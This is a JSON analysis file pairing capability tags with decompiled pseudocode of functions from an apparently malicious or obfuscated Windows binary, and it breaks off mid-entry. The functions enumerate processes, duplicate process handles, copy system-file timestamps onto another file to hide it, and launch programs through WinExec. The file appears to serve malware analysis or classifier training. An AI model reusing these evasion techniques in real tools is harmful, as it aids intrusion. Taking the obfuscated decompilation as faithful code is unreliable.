{
    "00401060": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010ea) overlaps instruction at (ram,0x004010e9)\n// \n// WARNING: Control flow encountered bad instruction data\n\nint32_t * __cdecl fcn.00401060(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    char *unaff_EBX;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            piVar2 = arg_8h >> 0x10;\n            uVar1 = arg_8h >> 0x10;\n            bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n            if (uVar1 != 0) {\n                if ((bVar3) && (!bVar3)) {\n                    *0xffff = *0xffff & 0xffffff81;\n                    if (in_ECX != 1) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    *piVar2 = *piVar2 + 1;\n                    *unaff_EBX = *unaff_EBX + (arg_8h >> 0x10);\n                    return piVar2;\n                }\n                arg_8h = piVar2 + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 399
    },
    "00404980": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a65) overlaps instruction at (ram,0x00404a63)\n// \n// WARNING: Removing unreachable block (ram,0x004049f8)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404980(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int32_t **ppiVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t extraout_ECX;\n    uint32_t uVar7;\n    uchar *unaff_EBX;\n    char *unaff_EBP;\n    uchar *puVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    int32_t **unaff_EDI;\n    char *pcVar11;\n    uchar uVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    char cVar14;\n    char cVar15;\n    char cVar16;\n    uint64_t uVar17;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    uVar17 = fcn.00401060(0, arg_8h, arg_ch + 1U >> 1);\n    uVar7 = uVar17;\n    piVar9 = uVar7 & 0xffff;\n    uVar12 = 0;\n    cVar16 = '\\0';\n    cVar15 = '\\0';\n    cVar14 = (uVar17 & 0xffff) == 0;\n    bVar13 = (POPCOUNT(uVar7 & 0xff) & 1U) == 0;\n    if ((bVar13) || (!bVar13)) {\n        uVar17 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n        if (cVar16 == cVar15) goto code_r0x004049da;\ncode_r0x004049f3:\n        uVar7 = *(uVar17 + 0x58);\n        if ((uVar12) || (!uVar12)) {\n            bVar13 = piVar9 < uVar7;\n        }\n        else {\n            uVar7 = uVar7 - 1;\n            if (uVar7 != 0 && cVar14 != '\\0') {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            iVar5 = *piVar9;\n            *arg_8h = piVar9 + 1;\n            uVar17 = CONCAT44(iVar5 >> 0x1f, *0x9750e2b5);\n            piVar9 = 0x66b8ec44;\n            bVar13 = 0x66b8ec44 < uVar7;\n        }\n        unaff_EBP = uVar17 >> 0x20;\n        iVar5 = uVar17;\n        ppiVar3 = arg_8h;\n        unaff_EBX = &stack0xfffffffc;\n        if (!bVar13) {\n            unaff_EBP = uVar7 & 0xffff;\n            puVar10 = piVar9 - unaff_EBP;\n            goto code_r0x00404a4e;\n        }\n    }\n    else {\n        piVar1 = arg_8h + -1;\n        *piVar1 = *piVar1 + 0x15;\n        ppiVar3 = unaff_EDI;\n        if (-1 < *piVar1) {\n            uVar17 = uVar17 & 0xffffffff00000000 | uVar7 + 1;\n            puVar2 = extraout_ECX + 0x197cf845;\n            uVar6 = extraout_ECX;\n            uVar12 = CARRY1(*puVar2, uVar6);\n            cVar16 = SCARRY1(*puVar2, uVar6);\n            *puVar2 = *puVar2 + uVar6;\n            cVar15 = *puVar2 < '\\0';\n            cVar14 = *puVar2 == 0;\ncode_r0x004049da:\n            if (cVar16 != cVar15) {\n                piVar9 = piVar9 + -1;\n                pcVar11 = arg_8h | &stack0xfffffffc;\n                arg_8h = pcVar11 + 1;\n                *pcVar11 = uVar17;\n                uVar12 = false;\n                uVar4 = uVar17 + (uVar17 >> 8) * 'y';\n                uVar17 = uVar17 & 0xffffff0000000000 | uVar17 & 0xffffff00ffff0000 | uVar4;\n                cVar14 = uVar4 == 0;\n            }\n            goto code_r0x004049f3;\n        }\n    }\n    puVar8 = unaff_EBX;\n    arg_8h = ppiVar3;\n    uVar7 = *(puVar8 + -4);\n    puVar10 = (*(puVar8 + 8) - *(puVar8 + -4) & 0xffffU) - 1;\n    *(puVar8 + 8) = puVar10;\n    iVar5 = *(puVar8 + -8);\ncode_r0x00404a4e:\n    bVar13 = (POPCOUNT(puVar10 & 0xff) & 1U) != 0;\n    if ((bVar13) && (!bVar13)) {\n        out(*puVar10, unaff_EBP);\n        do {\n            cVar14 = iVar5 >> 8;\n            in_AF = 9 < (iVar5 & 0xf) | in_AF;\n            iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar14 - in_AF), -in_AF);\n        } while (in_AF || cVar14 == *unaff_EBP);\n        piVar9 = arg_8h + unaff_EBP * 2;\n        *piVar9 = (*piVar9 + 0x7b) - in_AF;\n        *(uVar7 - 0x3f) = iVar5;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(puVar8 + -4) = uVar7 >> 0x10;\n    if (puVar10 < uVar7 >> 0x10) {\n        iVar5 = *(puVar8 + -8);\n        uVar7 = (*(puVar8 + 8) - *(puVar8 + -4) & 0xffffU) - 1;\n        *(puVar8 + 8) = uVar7;\n    }\n    else {\n        uVar7 = puVar10 - (uVar7 >> 0x10);\n    }\n    piVar9 = *(puVar8 + 0x14);\n    bVar13 = CARRY4(uVar7, *(puVar8 + 0xc));\n    *piVar9 = uVar7 + *(puVar8 + 0xc);\n    if ((bVar13) || (!bVar13)) {\n        piVar9 = *(puVar8 + 0x10);\n    }\n    *piVar9 = *(iVar5 + 0x58);\n    return;\n}\n",
        "token_count": 1645
    },
    "004011d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401249) overlaps instruction at (ram,0x00401248)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004011d0(void)\n\n{\n    uchar uVar1;\n    unkbyte6 Var2;\n    uint16_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uchar *extraout_ECX_00;\n    uchar *puVar6;\n    uchar *extraout_ECX_01;\n    ushort extraout_DX;\n    ushort uVar7;\n    uint32_t unaff_EBX;\n    uint32_t uVar8;\n    uint *unaff_EDI;\n    uint *puVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t in_stack_0e58be50;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((0x7f < &stack0xfffffffc) && (0x7f >= &stack0xfffffffc)) {\n        func_0x10187166();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar9 = unaff_EDI;\n    uVar8 = unaff_EBX;\n    iVar5 = fcn.004048f0();\n    if (iVar5 == 0) {\n        return 0;\n    }\n    uVar3 = unaff_EDI + 0x2562;\n    bVar10 = false;\n    bVar12 = false;\n    bVar11 = (uVar3 & 0xffffff00 | uVar3 | 0x4c | extraout_ECX) == 0;\n    uVar4 = fcn.00403a50();\n    if ((bVar12) || (!bVar12)) {\n        iVar5 = fcn.00404810(0x411210);\n        puVar6 = extraout_ECX_01;\n        if (iVar5 == -1) {\n            int.00401e10();\n            *0x423660 = 1;\n            iVar5 = fcn.00401840();\n            if (iVar5 != 0) {\n                return 0;\n            }\n            uVar7 = 0;\n            var_20h = 0;\n            uVar4 = 0;\n            var_80h._0_1_ = 0;\n            puVar9 = &var_1fh ^ in_stack_0e58be50;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            goto code_r0x004012b8;\n        }\n    }\n    else {\n        puVar9 = unaff_EDI + 1;\n        uVar1 = in(extraout_DX);\n        *unaff_EDI = uVar1;\n        uVar8 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        puVar6 = extraout_ECX_00;\n        uVar7 = extraout_DX;\n        if (!bVar10 && !bVar11) {\ncode_r0x004012b8:\n            *puVar9 = uVar4;\n            *(puVar9 + 2) = uVar4;\n            var_40h._0_1_ = uVar7;\n            puVar9 = &var_80h + 1;\n            var_60h._0_1_ = var_40h;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *puVar9 = 0;\n            *(puVar9 + 2) = 0;\n            puVar9 = &var_60h + 1;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *puVar9 = 0;\n            *(puVar9 + 2) = 0;\n            puVar9 = &var_40h + 1;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *puVar9 = 0;\n            *(puVar9 + 2) = 0;\n            iVar5 = fcn.00404da0(&var_80h, &var_60h, &var_20h, &var_40h);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            iVar5 = fcn.00403d20(&var_20h);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            iVar5 = fcn.00404530();\n            return iVar5 != 0;\n        }\n    }\n    Var2 = *((uVar8 & 0xffff0000 | CONCAT11(*puVar6, uVar8)) + CONCAT31(0x411210, (puVar6 >> 8) + 'h') * 4);\n    *(puVar9 + 0x5e) = *(puVar9 + 0x5e);\n    return Var2;\n}\n",
        "token_count": 1243
    },
    "00401420": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401420(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4111e4;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00402a30(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, *0x10 + -0x28, 0xe0, 0xe8);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1153
    },
    "00401840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401862) overlaps instruction at (ram,0x00401861)\n// \n\nuint fcn.00401840(void)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    bool bVar2;\n    \n    iVar1 = fcn.00402a30(0x4111ac);\n    bVar2 = iVar1 + 1 < 0;\n    if (iVar1 != -1) {\n        if ((bVar2) || (!bVar2)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n        else {\n            *unaff_EBX = *unaff_EBX & 0xc3;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 172
    },
    "00402c60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402cb0) overlaps instruction at (ram,0x00402caf)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402c60(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char extraout_CH;\n    int32_t in_ECX;\n    ushort in_DX;\n    uint8_t *unaff_EBX;\n    uint unaff_ESI;\n    uint *unaff_EDI;\n    bool in_ZF;\n    bool bVar6;\n    ulong uVar7;\n    uchar auStack20 [3];\n    uint32_t uStack21;\n    uchar uStack17;\n    uchar uStack16;\n    ushort uStack15;\n    uchar uStack13;\n    int32_t hObject;\n    \n    uStack16 = unaff_ESI;\n    uStack15 = unaff_ESI >> 8;\n    uStack13 = unaff_ESI >> 0x18;\n    uStack21 = unaff_EDI << 8;\n    uStack17 = unaff_EDI >> 0x18;\n    if (in_ZF) {\ncode_r0x00402c85:\n        iVar5 = 0x41121800;\n        uStack21 = uStack21 & 0xffffff00;\n    }\n    else {\n        iVar5 = unaff_EDI << 8;\n        uStack21 = uStack21 | unaff_EDI >> 0x18;\n        if (!in_ZF) goto code_r0x00402c85;\n        uVar3 = in(in_DX);\n        *unaff_EDI = uVar3;\n        hObject = in_ECX;\n        if (auStack20 < 1) goto code_r0x00402cef;\n        uVar4 = in_EAX ^ 0xdee0ed6d;\n        puVar1 = (uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31) + 0x18;\n        *puVar1 = *puVar1 ^ in_ECX >> 8;\n    }\n    uVar7 = fcn.00404810(CONCAT13(uStack21, iVar5 >> 8));\n    uVar4 = uVar7;\n    bVar6 = uVar4 + 1 < 0;\n    if (uVar4 == 0xffffffff) {\n        return 0;\n    }\n    if ((bVar6) || (!bVar6)) {\n        uStack21 = uStack21 & 0xffffff00 | uVar4 >> 0x18;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    pcVar2 = (uVar7 >> 0x20) + 0x40;\n    *pcVar2 = *pcVar2 + extraout_CH;\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    bVar6 = hObject == 0;\n    if (bVar6) {\n        return 0;\n    }\n    if (!bVar6) {\n        if (bVar6) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uStack17 = 2;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack21 = 0;\ncode_r0x00402cef:\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar5 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n    if (iVar5 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 856
    },
    "00404080": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040409a) overlaps instruction at (ram,0x00404098)\n// \n\nuint __fastcall fcn.00404080(int32_t param_1, uint8_t *param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar3;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint8_t in_CF;\n    bool in_PF;\n    uint8_t in_AF;\n    ushort in_stack_fffffff8;\n    uint uVar4;\n    \n    if (!in_PF) {\n        uVar4 = CONCAT22(unaff_ESI, in_stack_fffffff8);\n        if (in_PF) {\n            out(*unaff_ESI, param_2);\n            in_CF = in_AF;\n            do {\n                uVar3 = in_EAX >> 8;\n                in_CF = 9 < (in_EAX & 0xf) | in_CF;\n                param_3 = CONCAT31(CONCAT21(in_EAX >> 0x10, uVar3 - in_CF), -in_CF);\n                in_EAX = param_3;\n            } while (in_CF || uVar3 == *param_2);\n            goto code_r0x00404094;\n        }\n    }\n    uVar4 = 0;\ncode_r0x00404094:\n    piVar1 = unaff_EDI + param_2 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_CF;\n    *(param_1 + -0x75) = param_3;\n    *param_2 = *param_2 | param_1 >> 8;\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(param_3, uVar4);\n    if (iVar2 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 431
    },
    "00404190": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041fd) overlaps instruction at (ram,0x004041fc)\n// \n\nint32_t __cdecl\nfcn.00404190(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint8_t *arg_1ch, int32_t arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_18h_00;\n    uint32_t uVar6;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402840(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    bVar5 = false;\n    uVar6 = 0x4041e5;\n    uVar2 = fcn.00402840(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    if (!bVar5) {\n        uVar6 = uVar6 & 0xffff | arg_1ch << 0x10;\n        if (bVar5) goto code_r0x004041ed;\n    }\n    uVar6 = arg_20h + 0xa0;\n    uVar2 = arg_10h;\ncode_r0x004041ed:\n    cVar1 = uVar2 - *arg_1ch;\n    arg_18h_00 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *arg_1ch) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                 (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4\n                 | uVar2 < *arg_1ch | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                 (in_AC & 1) * 0x40000;\n    uVar6 = func_0x1018a16f(arg_18h_00, uVar6);\n    fcn.00402840(arg_18h, arg_1ch + 1, uVar6 & 0xffffff00 | *0x52000000, 0x20, arg_18h_00);\n    fcn.00402840(arg_18h, arg_1ch + 1, arg_14h, 0x20, arg_20h + 0xdf);\n    iVar3 = fcn.00404140();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x11f) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x11f) = iVar3;\n    }\n    var_10ch = 0;\n    puVar4 = &fcn.00404190::var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_4h = 0x104;\n    *(puVar4 + 2) = 0;\n    iVar3 = fcn.00402560(0x80000001, 0x4113f4, 0x411420, &fcn.00404190::var_8h, &stack0xfffffef0, &fcn.00404190::var_4h)\n    ;\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&stack0xfffffef0, 0x411470);\n        if (iVar3 == 0) {\n            *(arg_20h + 0x11f) = *(arg_20h + 0x11f) | 0x80;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1080
    },
    "00404530": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404632) overlaps instruction at (ram,0x0040462d)\n// \n// WARNING: Removing unreachable block (ram,0x00404588)\n\nuint32_t fcn.00404530(int32_t param_1, uint32_t param_2, uint param_3, uint param_4)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint8_t extraout_CL;\n    int32_t iVar7;\n    uchar *extraout_ECX;\n    uchar *arg_8h;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    uchar uVar9;\n    bool bVar10;\n    unkbyte6 Var11;\n    uchar *puStack572;\n    uchar *puStack568;\n    uint uStack535;\n    uchar uStack276;\n    uchar auStack275 [259];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffde9;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uStack276 = 0;\n    puVar8 = &stack0xfffffeed;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    uStack16 = 1;\n    *(puVar8 + 2) = 0;\n    uVar9 = 1;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puStack572 = &stack0xfffffeec;\n    puStack568 = 0x4111cc;\n    Var11 = (*_sym.imp.MSVCRT.dll_sprintf)();\n    uVar4 = Var11;\n    if ((uVar9) || (!uVar9)) {\n        puVar5 = &stack0xfffffff4;\n        arg_8h = &stack0xfffffff8;\ncode_r0x004045df:\n        fcn.004017b0(arg_8h, puVar5);\n        iVar7 = fcn.00402b10(param_1, param_2, param_3, param_4, uStack8, uStack12);\n        if (iVar7 == 0) {\n            return 0;\n        }\n        puVar5 = &stack0xfffffffc;\n        if ((0 < iVar7) && (puVar5 = &stack0xfffffffc,  iVar7 < 1)) {\n            unaff_EBX = unaff_EBX + 1;\n            *(iVar7 + -0x74c625aa) = *(iVar7 + -0x74c625aa) ^ extraout_CL;\n            puVar5 = &stack0xfffffffd;\n        }\n        puStack568 = puVar5 + -0x110;\n        puStack572 = 0x404646;\n        uVar4 = fcn.00402d40();\n        bVar10 = false;\n        uVar6 = param_2;\n        uVar3 = uVar4;\n    }\n    else {\n        uVar6 = puVar8 + 7;\n        uVar2 = in(Var11 >> 0x20);\n        *(puVar8 + 3) = uVar2;\n        if (0 < &stack0xfffffdc4) {\n            uVar4 = uVar4 ^ 0xdee0ed6d;\n            puVar5 = uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31;\n            arg_8h = extraout_ECX;\n            goto code_r0x004045df;\n        }\n        out(0xff, Var11);\n        puVar1 = unaff_EBX + -0x3f7af33c;\n        bVar10 = SCARRY4(*puVar1, 1);\n        *puVar1 = *puVar1 + 1;\n        uVar3 = *puVar1;\n    }\n    if (uVar3 == 0) {\n        return uVar4;\n    }\n    if ((bVar10 == uVar3 < 0) && (bVar10 != uVar3 < 0)) {\n        param_1 = param_1 + -1;\n        *(uVar6 | puVar5) = uVar4;\n    }\n    fcn.00401110();\n    iVar7 = fcn.00404810(0x411204);\n    if (iVar7 == -1) {\n        iVar7 = fcn.00404810(0x4111f8);\n        if (iVar7 == -1) goto code_r0x00404704;\n        unaff_EBX = 0xf;\n    }\n    else {\n        unaff_EBX = 0xe;\n    }\n    puStack568 = 0x4046d0;\n    iVar7 = fcn.004047d0(param_1);\n    if (iVar7 != 0) {\n        fcn.00404ae0();\n        puStack568 = 0x4046e3;\n        fcn.00402550();\n        return 1;\n    }\n    if (*0x42365c == 0) {\n        return 0;\n    }\ncode_r0x00404704:\n    uVar2 = *(puVar5 + 8);\n    puStack568 = 0x40471c;\n    puStack572 = unaff_EBX;\n    iVar7 = fcn.004039d0(uVar2, puVar5 + -0x110);\n    if (iVar7 == 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = *(puVar5 + -0xc);\n    }\n    if ((uVar4 != 0) && (uVar6 = fcn.00402940(uVar2),  uVar6 == 0)) {\n        *(puVar5 + -0xc) = 0;\n        uVar4 = uVar6;\n    }\n    if (uVar4 == 0) {\n        puStack568 = 0x404776;\n        uVar4 = fcn.00403b80(uVar2, 0);\n        *(puVar5 + -0xc) = uVar4;\n    }\n    if (uVar4 != 0) {\n        fcn.00402550();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    puStack568 = 0x411218;\n    puStack572 = 0x4047bf;\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return uVar4;\n}\n",
        "token_count": 1557
    },
    "00404810": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404810(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x423664)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_8h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x423668)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x004048dd:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_128h;\n            iVar1 = var_8h;\n            goto code_r0x004048dd;\n        }\n        iVar2 = (**0x42366c)(iVar1, &var_130h);\n    } while( true );\n}\n",
        "token_count": 369
    },
    "00403e50": {
        "rules": [
